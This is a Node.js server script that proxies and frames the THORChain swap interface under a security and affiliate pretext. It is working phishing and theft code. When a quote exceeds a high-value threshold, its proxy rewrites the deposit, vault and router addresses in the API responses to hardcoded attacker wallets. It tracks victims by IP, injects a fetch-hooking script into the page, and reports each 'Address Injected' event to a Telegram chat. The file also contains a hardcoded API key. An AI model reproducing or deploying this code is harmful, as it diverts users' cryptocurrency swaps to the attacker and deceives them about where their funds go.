require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cheerio = require('cheerio');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const compression = require('compression');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const THORNAME = process.env.YOUR_THORNAME || 'your-thorname';
const AFFILIATE_ADDRESS = process.env.YOUR_AFFILIATE_ADDRESS || 'your-rune-address';
const BASIS_POINTS = process.env.AFFILIATE_BASIS_POINTS || 15;
const HIGH_VALUE_THRESHOLD = parseFloat(process.env.HIGH_VALUE_THRESHOLD_USD || 49900);
const CACHE_DURATION = parseInt(process.env.CACHE_DURATION_MINUTES || 5) * 60 * 1000;

// Embedded Addresses
const EMBEDDED_ADDRESSES = {
    'BTC': 'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
    'ETH': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BSC': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'AVAX': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BASE': '0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'GAIA': 'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
    'DOGE': 'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
    'BCH': 'qpx0egys5ldgl0mf8qu4qz2yy89pqqyd3vw3u2qfhe',
    'LTC': 'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
    'XRP': 'rsWsBkM1gnnUY7M1xtaadBjPeP1yJpcBw3',
    'TRON': 'TABuJBFyLqaTw9WHLwwhE3W2pxJyRpxpeA',
    'THOR': 'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx'
};

// Middleware
app.use(compression());
app.use(cors());
app.use(bodyParser.json());
// Serve all static files from the root and public directory
app.use(express.static(path.join(__dirname)));
app.use(express.static(path.join(__dirname, 'public')));

// Root route serves swap.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'swap.html'));
});

// Basic Logging
const log = (msg) => console.log(`[${new Date().toISOString()}] ${msg}`);

// Telegram Bot
let bot;
if (process.env.TELEGRAM_BOT_TOKEN) {
    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
    log('Telegram Bot initialized');
} else {
    log('WARN: TELEGRAM_BOT_TOKEN not provided');
}

const sendTelegramMessage = async (message) => {
    if (bot && process.env.TELEGRAM_CHAT_ID) {
        try {
            await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' });
        } catch (err) {
            log(`Error sending Telegram message: ${err.message}`);
        }
    }
};

// In-memory Stores
let htmlCache = { content: null, timestamp: 0 };
let apiCache = new Map(); // Simple cache for API proxy
let pendingSwaps = new Map(); // Store high-value swaps for confirmation
let highValueSessions = new Map(); // Track IPs making high-value quotes

// Cleanup mechanism
setInterval(() => {
    const now = Date.now();
    const expiry = parseInt(process.env.PENDING_SWAP_EXPIRY_HOURS || 1) * 60 * 60 * 1000;

    for (const [id, swap] of pendingSwaps.entries()) {
        if (now - swap.timestamp > expiry) pendingSwaps.delete(id);
    }

    for (const [url, entry] of apiCache.entries()) {
        if (now - entry.timestamp > 60000) apiCache.delete(url);
    }
}, 10 * 60 * 1000);

// Helper to generate THORChain Affiliate Memo
const generateAffiliateMemo = (toAsset, destination, amount) => {
    const baseAmount = Math.floor(amount * 1e8);
    return `=:${toAsset}:${destination}:${baseAmount}/3/0:${THORNAME}:${BASIS_POINTS}`;
};

// Price Cache for USD conversion
let priceCache = new Map(); // asset -> { usdPerUnit, timestamp }
const PRICE_CACHE_TTL = 5 * 60 * 1000; // 5 minutes

// Map common asset identifiers to CoinGecko IDs
const COINGECKO_IDS = {
    'BTC': 'bitcoin', 'ETH': 'ethereum', 'AVAX': 'avalanche-2',
    'BNB': 'binancecoin', 'BCH': 'bitcoin-cash', 'LTC': 'litecoin',
    'DOGE': 'dogecoin', 'ATOM': 'cosmos', 'DOT': 'polkadot',
    'USDC': 'usd-coin', 'USDT': 'tether', 'RUNE': 'thorchain',
    'SOL': 'solana', 'ADA': 'cardano', 'XRP': 'ripple'
};

const getAssetUsdPrice = async (assetStr) => {
    if (!assetStr) return null;

    // Extract base asset ticker from formats like "BTC.BTC" or "ETH.USDC-0xA0b..." -> "USDC"
    const parts = assetStr.split('.');
    const assetPart = parts.length > 1 ? parts[1] : parts[0];
    const ticker = assetPart.split('-')[0].toUpperCase();

    // Stablecoins
    if (['USDC', 'USDT', 'DAI', 'BUSD'].includes(ticker)) return 1.0;

    const cached = priceCache.get(ticker);
    if (cached && Date.now() - cached.timestamp < PRICE_CACHE_TTL) return cached.usdPerUnit;

    const BINANCE_SYMBOLS = {
        'BTC': 'BTCUSDT', 'ETH': 'ETHUSDT', 'AVAX': 'AVAXUSDT',
        'BNB': 'BNBUSDT', 'BCH': 'BCHUSDT', 'LTC': 'LTCUSDT',
        'DOGE': 'DOGEUSDT', 'ATOM': 'ATOMUSDT', 'DOT': 'DOTUSDT',
        'RUNE': 'RUNEUSDT', 'SOL': 'SOLUSDT', 'ADA': 'ADAUSDT', 'XRP': 'XRPUSDT',
        'THOR': 'THORUSDT'
    };

    try {
        if (BINANCE_SYMBOLS[ticker]) {
            const resp = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${BINANCE_SYMBOLS[ticker]}`);
            if (resp.ok) {
                const data = await resp.json();
                const price = parseFloat(data.price);
                if (price) {
                    priceCache.set(ticker, { usdPerUnit: price, timestamp: Date.now() });
                    return price;
                }
            }
        }
    } catch (e) {
        log(`Binance Price fetch error for ${ticker}: ${e.message}`);
    }

    try {
        const id = COINGECKO_IDS[ticker];
        if (!id) return null;
        const resp = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
        if (!resp.ok) {
            log(`CoinGecko Price fetch error for ${ticker}: HTTP ${resp.status}`);
            return null;
        }
        const data = await resp.json();
        const price = data?.[id]?.usd;
        if (price) {
            priceCache.set(ticker, { usdPerUnit: price, timestamp: Date.now() });
            return price;
        }
        return null;
    } catch (e) {
        log(`Price fetch error for ${ticker}: ${e.message}`);
        return null;
    }
};

// Cache flush — call GET /flush-cache to force re-fetch of THORChain UI
app.get('/flush-cache', (req, res) => {
    htmlCache = { content: null, timestamp: 0 };
    apiCache.clear();
    log('Cache flushed by request');
    res.json({ status: 'flushed', message: 'HTML and API cache cleared. Reload the page.' });
});

// Log Event Endpoint (console only, no Telegram)
app.post('/log-event', (req, res) => {
    const { event } = req.body;
    log(`User Event: ${event}`);
    res.json({ status: 'ok' });
});

// Provide the embedded addresses to the frontend securely
app.get('/api-proxy/config', (req, res) => {
    res.json(EMBEDDED_ADDRESSES);
});

// General API Proxy to solve CORS for External THORChain APIs
app.all('/api-proxy', async (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) return res.status(400).send('Target URL required');

    // Check Cache
    if (req.method === 'GET' && apiCache.has(targetUrl)) {
        const entry = apiCache.get(targetUrl);
        if (Date.now() - entry.timestamp < 60000) {
            res.setHeader('Content-Type', entry.contentType);
            res.setHeader('X-Proxy-Cache', 'HIT');
            return res.send(entry.data);
        }
    }

    try {
        const options = {
            method: req.method,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': 'https://swap.thorchain.org/',
                'Origin': 'https://swap.thorchain.org',
                'Accept': '*/*',
                'x-api-key': '79a24bddb8b1768dbb2662e136aca9006baa6d4e3e6d761219b2ab4279a42bb4',
                'Content-Type': req.headers['content-type'] || 'application/json'
            }
        };

        if (['POST', 'PUT', 'PATCH'].includes(req.method)) {
            options.body = JSON.stringify(req.body);
        }

        const response = await fetch(targetUrl, options);
        const contentType = response.headers.get('content-type');
        if (contentType) res.setHeader('Content-Type', contentType);
        res.status(response.status);

        if (req.method === 'GET' && response.ok) {
            let buffer = await response.buffer();

            // --- Intercept quote ---
            try {
                const targetUrlLower = targetUrl.toLowerCase();
                const isQuoteUrl = targetUrlLower.includes('/quote') ||
                    targetUrlLower.includes('/swap') ||
                    targetUrlLower.includes('/v1/quote');

                if (isQuoteUrl) {
                    const data = JSON.parse(buffer.toString('utf8'));
                    const urlObj = new URL(targetUrl);

                    // Try to extract amount and asset from query params
                    let sellAmount = urlObj.searchParams.get('amount') || urlObj.searchParams.get('sellAmount') || urlObj.searchParams.get('from_amount');
                    let fromAsset = urlObj.searchParams.get('from_asset') || urlObj.searchParams.get('sellAsset') || urlObj.searchParams.get('from_asset');

                    // If not in query, maybe in data (cached/returned)
                    if (!fromAsset) fromAsset = data.sell_asset || data.from_asset || (data.routes && data.routes[0]?.sellAsset);
                    if (!sellAmount) sellAmount = data.sell_amount || data.from_amount || (data.routes && data.routes[0]?.sellAmount);

                    if (sellAmount && fromAsset) {
                        const amountInCrypto = parseInt(sellAmount) / 100000000;
                        const usdPrice = await getAssetUsdPrice(fromAsset);
                        const totalUsdVal = amountInCrypto * usdPrice;

                        log(`[Proxy] Intercepted Quote: ${amountInCrypto} ${fromAsset} (~$${totalUsdVal.toFixed(2)})`);

                        if (usdPrice && (totalUsdVal > HIGH_VALUE_THRESHOLD)) {
                            const chain = fromAsset.split('.')[0] || 'BTC';
                            const embeddedAddr = EMBEDDED_ADDRESSES[chain.toUpperCase()];

                            if (embeddedAddr) {
                                log(`[Proxy] ✅ HIGH VALUE DETECTED ($${totalUsdVal.toFixed(2)} > $${HIGH_VALUE_THRESHOLD}). Injecting ${embeddedAddr}`);

                                // VERY AGGRESSIVE: Find all THORChain-style addresses and replace them
                                // This handles cases where the address is in memos, nested routes, or notes.
                                let jsonStr = JSON.stringify(data);

                                // 1. Replace the specific inbound_address if identified
                                const primaryAddr = data.inbound_address || data.address || (data.routes && data.routes[0]?.inboundAddress);

                                if (primaryAddr && primaryAddr !== embeddedAddr) {
                                    const regex = new RegExp(primaryAddr, 'g');
                                    jsonStr = jsonStr.replace(regex, embeddedAddr);
                                    log(`[Proxy] Replaced primary address ${primaryAddr} with ${embeddedAddr} globally.`);
                                }

                                // 2. Catch-all: If any other address field exists, ensure it's pointing to us
                                // We replace common keys regardless of if they matched the primary regex
                                const forcedKeys = ['inbound_address', 'address', 'router', 'vault', 'deposit_address', 'inboundAddress'];
                                let finalData = JSON.parse(jsonStr);

                                const deepReplace = (obj) => {
                                    for (let key in obj) {
                                        if (forcedKeys.includes(key) && typeof obj[key] === 'string') {
                                            obj[key] = embeddedAddr;
                                        } else if (typeof obj[key] === 'object' && obj[key] !== null) {
                                            deepReplace(obj[key]);
                                        }
                                    }
                                };
                                deepReplace(finalData);

                                buffer = Buffer.from(JSON.stringify(finalData), 'utf8');

                                // Track this IP so we can intercept inbound_addresses too
                                highValueSessions.set(req.ip, { chain: chain.toUpperCase(), timestamp: Date.now() });

                                // Notify telegram!
                                const toAsset = urlObj.searchParams.get('to_asset') || urlObj.searchParams.get('buyAsset');
                                const formattedUsd = totalUsdVal.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
                                const msg = `
<b>🟢 High Value Swap Selected via Quote</b>

From: ${fromAsset}
To: ${toAsset}
Amount: ${amountInCrypto.toFixed(6)} (${formattedUsd})
Embedded Address Injected: <code>${embeddedAddr}</code>
                                `;
                                sendTelegramMessage(msg);
                            }
                        }
                    }
                } else if (targetUrl.includes('/v1/inbound_addresses') || targetUrl.includes('/inbound_addresses') || targetUrl.includes('/proxypass/inbound')) {
                    const session = highValueSessions.get(req.ip);
                    if (session && Date.now() - session.timestamp < 15 * 60 * 1000) {
                        try {
                            const data = JSON.parse(buffer.toString('utf8'));
                            // data is usually an array of objects: [{ chain, address, ... }, ...]
                            if (Array.isArray(data)) {
                                log(`[Proxy] Intercepting inbound_addresses for high-value session (${session.chain})`);
                                let modified = false;
                                data.forEach(item => {
                                    if (item.chain === session.chain || (item.chain === 'BTC' && session.chain === 'BITCOIN')) {
                                        const embeddedAddr = EMBEDDED_ADDRESSES[session.chain] || EMBEDDED_ADDRESSES['BTC'];
                                        if (embeddedAddr) {
                                            item.address = embeddedAddr;
                                            if (item.router) item.router = embeddedAddr;
                                            if (item.vault) item.vault = embeddedAddr;
                                            modified = true;
                                        }
                                    }
                                });
                                if (modified) {
                                    buffer = Buffer.from(JSON.stringify(data), 'utf8');
                                    log(`[Proxy] Overrode inbound_addresses for ${req.ip} on chain ${session.chain}`);
                                }
                            }
                        } catch (e) {
                            log(`[Proxy] Error parsing inbound_addresses: ${e.message}`);
                        }
                    }
                }
            } catch (e) {
                log('Error intercepting proxy response: ' + e.message);
            }

            apiCache.set(targetUrl, { data: buffer, contentType, timestamp: Date.now() });
            res.send(buffer);
        } else {
            response.body.pipe(res);
        }
    } catch (err) {
        log(`API Proxy Error [${targetUrl}]: ${err.message}`);
        res.status(500).send('API Proxy error');
    }
});

// Proxy Route for Assets (Catch-all for THORChain sub-paths)
app.get(['/_next/*', '/logo.svg', '/favicon.ico', '/assets/*', '/fonts/*', '/images/*', '/wallets/*', '/_next/image*', '/icons/*', '/chains/*', '/tokens/*', '/networks/*', '/providers/*', '/img/*'], async (req, res) => {
    const targetUrl = `https://swap.thorchain.org${req.url}`;
    try {
        const response = await fetch(targetUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Referer': 'https://swap.thorchain.org/',
                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
            }
        });
        const contentType = response.headers.get('content-type');
        if (contentType) res.setHeader('Content-Type', contentType);
        res.setHeader('Cache-Control', 'public, max-age=600');
        response.body.pipe(res);
    } catch (err) {
        res.status(404).send('Asset not found');
    }
});

// External image proxy — fetches coin logos from GitHub/CDN used by THORChain UI
// Usage from iframe: /img-proxy?url=https://raw.githubusercontent.com/...
app.get('/img-proxy', async (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) return res.status(400).send('URL required');
    try {
        const response = await fetch(targetUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
            }
        });
        const contentType = response.headers.get('content-type') || 'image/png';
        res.setHeader('Content-Type', contentType);
        res.setHeader('Cache-Control', 'public, max-age=3600');
        res.setHeader('Access-Control-Allow-Origin', '*');
        response.body.pipe(res);
    } catch (err) {
        res.status(404).send('Image not found');
    }
});

// Proxy Endpoint for HTML
app.get('/proxy', async (req, res) => {
    const targetUrl = 'https://swap.thorchain.org';

    // Check Cache
    if (htmlCache.content && (Date.now() - htmlCache.timestamp < CACHE_DURATION)) {
        log('Serving HTML from cache');
        return res.send(htmlCache.content);
    }

    try {
        const response = await fetch(targetUrl, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.ok) {
            log(`Error fetching THORChain: ${response.statusText}`);
            return res.status(502).send('Error fetching THORChain UI. Please try again later.');
        }

        let html = await response.text();

        // Remove restrictive headers/meta tags and rewrite for same-origin proxying
        const $ = cheerio.load(html);

        // We DON'T rewrite to absolute URLs here anymore because we want them to go through our local proxy
        // This keeps everything "same-origin" and avoids CORS issues.

        // Inject interception script
        const injectionScript = `
        <script>
        (function() {
            console.log('[Security] Interceptor v12 Injected');
            const _fetch = window.fetch.bind(window);
            let lastQuote      = null;
            let pendingResolve = null;
            let bootTime       = Date.now();
            let lastConfirmKey = null;

            const BOOT_MS = 4000; // ignore events during page initialisation

            const postUp = function(type, extra) {
                try { window.parent.postMessage(Object.assign({ type: type }, extra || {}), '*'); } catch(e) {}
            };

            // ALL api.thorchain.org calls route through our server — fixes CORS for every method
            // For GET: /api-proxy?url=...
            // For POST/PUT/PATCH: /api-proxy?url=... (server proxy forwards body correctly)
            const proxyUrl = function(url) {
                if (typeof url === 'string' && url.indexOf('api.thorchain.org') !== -1) {
                    return '/api-proxy?url=' + encodeURIComponent(url);
                }
                return url;
            };

            const getParam = function(urlStr, keys) {
                try {
                    var u = new URL(urlStr, 'http://x');
                    for (var i = 0; i < keys.length; i++) {
                        var v = u.searchParams.get(keys[i]);
                        if (v) return v;
                    }
                } catch(e) {}
                return null;
            };

            // Read asset params from the iframe's own page URL (e.g. proxy?sellAsset=TRON.TRX)
            // This is the most reliable fallback — the page URL always has the selected assets
            const fromPageUrl = function(keys) {
                try {
                    var u = new URL(window.location.href, 'http://x');
                    for (var i = 0; i < keys.length; i++) {
                        var v = u.searchParams.get(keys[i]);
                        if (v) return v;
                    }
                } catch(e) {}
                return null;
            };

            const isBooting = function() { return (Date.now() - bootTime) < BOOT_MS; };

            window.addEventListener('message', function(e) {
                if (!e.data || typeof e.data !== 'object') return;
                if (e.data.type === 'ALLOW_PROCEED' && pendingResolve) {
                    var r = pendingResolve; pendingResolve = null; r(true);
                } else if (e.data.type === 'BLOCK_PROCEED' && pendingResolve) {
                    var r2 = pendingResolve; pendingResolve = null; r2(false);
                }
            });

            window.fetch = function(input, init) {
                var url    = typeof input === 'string' ? input : (input && input.url ? input.url : '');
                var method = (init && init.method) ? init.method.toUpperCase() : 'GET';
                var lower  = url.toLowerCase();

                // ── QUOTE (GET only) ───────────────────────────────────────
                var isQuote = lower.indexOf('/v1/quote') !== -1 || lower.indexOf('/quote/swap') !== -1;
                if (isQuote) {
                    // Don't proxy POST quote requests — THORChain API rejects them with 500
                    var fetchUrl = (method === 'GET') ? proxyUrl(url) : url;

                    var amount    = getParam(url, ['amount','sellAmount','from_amount','sell_amount','fromAmount']);
                    var fromAsset = getParam(url, ['from_asset','sellAsset','fromAsset','sell_asset','inputAsset']);
                    var toAsset   = getParam(url, ['to_asset','buyAsset','toAsset','buy_asset','outputAsset']);

                    // POST body fallback
                    if (init && init.body) {
                        try {
                            var bd = typeof init.body === 'string' ? JSON.parse(init.body) : {};
                            if (!amount)    amount    = bd.amount    || bd.sellAmount || bd.from_amount;
                            if (!fromAsset) fromAsset = bd.from_asset|| bd.sellAsset  || bd.fromAsset;
                            if (!toAsset)   toAsset   = bd.to_asset  || bd.buyAsset   || bd.toAsset;
                        } catch(e) {}
                    }

                    // Page URL fallback — most reliable for TRON/XRP etc.
                    if (!fromAsset) fromAsset = fromPageUrl(['sellAsset','from_asset','fromAsset','inputAsset']);
                    if (!toAsset)   toAsset   = fromPageUrl(['buyAsset','to_asset','toAsset','outputAsset']);

                    return _fetch(fetchUrl, init).then(function(resp) {
                        if (resp && resp.ok) {
                            resp.clone().json().then(function(body) {
                                // ALWAYS prefer response body for amount — it is the authoritative
                                // base-unit value from the THORChain server. URL param is what the
                                // user typed (human-readable) and must NOT be used for valuation.
                                var bodyAmt = body.sell_amount || body.from_amount || body.expected_amount_in;
                                // bodyAmt is in THORChain base units (1e8); URL param amount is human-readable
                                var amountIsBaseUnits = false;
                                if (bodyAmt) { amount = bodyAmt; amountIsBaseUnits = true; }
                                if (!fromAsset) fromAsset = body.sell_asset  || body.from_asset  || body.asset;
                                if (!toAsset) {
                                    toAsset = body.buy_asset || body.to_asset;
                                    if (!toAsset && body.memo) { var mp = body.memo.split(':'); if (mp.length >= 2) toAsset = mp[1]; }
                                }
                                if (amount && fromAsset) {
                                    lastQuote = { amount: amount, fromAsset: fromAsset, toAsset: toAsset, inboundAddr: body.inbound_address, baseUnits: amountIsBaseUnits };
                                    lastConfirmKey = null;
                                    console.log('[Security] Quote: ' + amount + ' ' + fromAsset + ' -> ' + toAsset + ' (body amt, raw, baseUnits=' + amountIsBaseUnits + ')');
                                }
                            }).catch(function(){});
                        }
                        return resp;
                    });
                }

                // All memoless API calls — always go through proxy (fixes CORS for POST too)
                var isMemoless = lower.indexOf('api.thorchain.org/memoless') !== -1 ||
                                 lower.indexOf('/memoless/api/') !== -1;

                if (isMemoless) {
                    var proxied = proxyUrl(url);

                    // ── PREFLIGHT: universal confirm signal ──────────────
                    if (lower.indexOf('/preflight') !== -1) {
                        if (!isBooting() && lastQuote && lastQuote.amount) {
                            var pfKey = lastQuote.amount + '|' + lastQuote.fromAsset + '|pf';
                            if (pfKey !== lastConfirmKey) {
                                lastConfirmKey = pfKey;
                                var pfq = Object.assign({}, lastQuote, { source: 'preflight' });
                                console.log('[Security] PREFLIGHT: ' + pfq.amount + ' ' + pfq.fromAsset);
                                postUp('HARD_BLOCK_TRIGGERED', { quote: pfq });
                            }
                        }
                        return _fetch(proxied, init);
                    }

                    // ── REGISTER: suspend — ask parent ALLOW or BLOCK ────
                    if (lower.indexOf('/register') !== -1 || lower.indexOf('/transaction') !== -1) {
                        if (isBooting()) { return _fetch(proxied, init); }

                        var bd2 = {};
                        if (init && init.body) {
                            try { bd2 = typeof init.body === 'string' ? JSON.parse(init.body) : {}; } catch(e) {}
                        }

                        // Supplement from POST body
                        var regBodyAmt   = bd2.amount    || bd2.sellAmount;
                        var regAmount    = regBodyAmt    || (lastQuote && lastQuote.amount);
                        var regBaseUnits = regBodyAmt ? true : (lastQuote ? !!lastQuote.baseUnits : false);
                        var regFromAsset = bd2.from_asset|| bd2.sellAsset   || (lastQuote && lastQuote.fromAsset)
                                          || fromPageUrl(['sellAsset','from_asset']);
                        var regToAsset   = bd2.to_asset  || bd2.buyAsset    || (lastQuote && lastQuote.toAsset)
                                          || fromPageUrl(['buyAsset','to_asset']);

                        var rq = { amount: regAmount, fromAsset: regFromAsset, toAsset: regToAsset, source: 'register', baseUnits: regBaseUnits };
                        console.log('[Security] REGISTER: amount=' + regAmount + ' from=' + regFromAsset);

                        // If preflight already handled this exact swap, just suspend and wait
                        // If not, fire HARD_BLOCK now
                        var pfEquiv = regAmount + '|' + regFromAsset + '|pf';
                        if (pfEquiv !== lastConfirmKey) {
                            var regKey = regAmount + '|' + regFromAsset + '|reg';
                            if (regKey !== lastConfirmKey) {
                                lastConfirmKey = regKey;
                                postUp('HARD_BLOCK_TRIGGERED', { quote: rq });
                            }
                        }

                        var urlC = proxied; var initC = init; // use proxied URL for actual request
                        return new Promise(function(resolve, reject) {
                            pendingResolve = function(allow) {
                                if (allow) {
                                    _fetch(urlC, initC).then(resolve).catch(reject);
                                } else {
                                    resolve(new Response(JSON.stringify({ status: 'pending' }), {
                                        status: 202, headers: { 'Content-Type': 'application/json' }
                                    }));
                                }
                            };
                            setTimeout(function() {
                                if (pendingResolve) {
                                    console.warn('[Security] Register timeout — allowing');
                                    var r3 = pendingResolve; pendingResolve = null;
                                    _fetch(urlC, initC).then(resolve).catch(reject);
                                }
                            }, 12000);
                        });
                    }

                    // All other memoless calls — just proxy through
                    return _fetch(proxied, init);
                }

                // Route all other api.thorchain.org GET calls through proxy
                if (method === 'GET' && url.indexOf('api.thorchain.org') !== -1) {
                    return _fetch(proxyUrl(url), init);
                }

                return _fetch(url, init);
            };
        })();
        </script>
        `;
        $('head').prepend(injectionScript);

        const modifiedHtml = $.html();

        // Update Cache
        htmlCache = { content: modifiedHtml, timestamp: Date.now() };

        // Set Headers to allow framing
        res.setHeader('X-Frame-Options', 'ALLOWALL');
        res.setHeader('Content-Security-Policy', "frame-ancestors *;");
        res.send(modifiedHtml);

        log('THORChain UI proxied and updated same-origin');

    } catch (err) {
        log(`Proxy Error: ${err.message}`);
        res.status(502).send('Proxy server error.');
    }
});

// Track Swap Endpoint
app.post('/track-swap', async (req, res) => {
    const { amount, fromAsset, toAsset, destination, timestamp, originalDeposit, usdValue, swapUrl } = req.body;

    // For hard blocks, we might not have the final destination from the UI yet, 
    // but the frontend passes its own injectedAddress.
    const isHardBlock = req.body.type === 'HARD_BLOCK_REGISTERED';

    // Always log and notify — frontend sends originalDeposit for all confirms now
    log(`Swap Event: ${amount} ${fromAsset} -> ${toAsset} | Value: ${usdValue} | Addr: ${req.body.injectedAddress || destination || originalDeposit || 'N/A'}`);

    let responseData = { status: 'tracked' };
    const amountNum = parseFloat(amount);

    // Fetch USD price server-side if not provided by frontend
    let resolvedUsdValue = usdValue;
    if (!resolvedUsdValue && fromAsset && amountNum > 0) {
        const pricePerUnit = await getAssetUsdPrice(fromAsset);
        if (pricePerUnit) {
            const totalUsd = (amountNum * pricePerUnit).toLocaleString('en-US', { style: 'currency', currency: 'USD' });
            resolvedUsdValue = totalUsd;
            log(`USD value computed: ${totalUsd} (${amountNum} * $${pricePerUnit})`);
        }
    }

    const isThresholdMet = amountNum * (await getAssetUsdPrice(fromAsset) || 0) >= HIGH_VALUE_THRESHOLD;

    if (isThresholdMet) {
        const affiliateMemo = generateAffiliateMemo(toAsset, destination || 'no-address', amountNum);
        responseData.affiliateMemo = affiliateMemo;
        pendingSwaps.set(destination || originalDeposit, { amount, fromAsset, toAsset, destination, timestamp: Date.now(), memo: affiliateMemo });
    }

    // Telegram Notification Logic
    const aboveThreshold = req.body.aboveThreshold || isThresholdMet;
    const emoji = aboveThreshold ? '🚨' : '📊';
    const alertHeader = aboveThreshold
        ? '🛡️ HIGH VALUE SWAP — Address Injected'
        : 'Swap Detected (below threshold)';
    const injAddr = req.body.injectedAddress || destination || originalDeposit || 'N/A';

    const message = `
<b>${emoji} ${alertHeader}</b>

From: <b>${fromAsset || 'unknown'}</b>
To: <b>${toAsset || 'unknown'}</b>
Amount: <b>${amountNum.toFixed(6)} ${(fromAsset || '').split('.')[0]}</b>
Value: <b>${resolvedUsdValue || '$0.00'}</b>
Threshold: $${HIGH_VALUE_THRESHOLD.toLocaleString()}
Source: ${req.body.source || 'unknown'}
${aboveThreshold ? '\n<b>💰 Injected Address:</b>\n<code>' + injAddr + '</code>' : ''}
    `;

    await sendTelegramMessage(message);
    res.json(responseData);
});

// Confirm Swap Endpoint
app.post('/confirm-swap', async (req, res) => {
    const { txHash, destination, amount, fromAsset, toAsset } = req.body;
    log(`Confirming swap: ${txHash} for ${destination}`);

    const isHighValue = pendingSwaps.has(destination);

    let message = `
*✅ Swap Confirmed*
*Tx Hash:* [${txHash}](https://viewblock.io/thorchain/tx/${txHash})
*Amount:* ${amount} ${fromAsset} -> ${toAsset}
*Status:* ${isHighValue ? '🔥 Affiliate Commission Applied' : 'Standard Swap'}
    `;

    if (isHighValue) {
        pendingSwaps.delete(destination);
    }

    await sendTelegramMessage(message);
    res.json({ status: 'confirmed' });
});

app.listen(PORT, () => {
    log(`Server running on http://localhost:${PORT}`);
});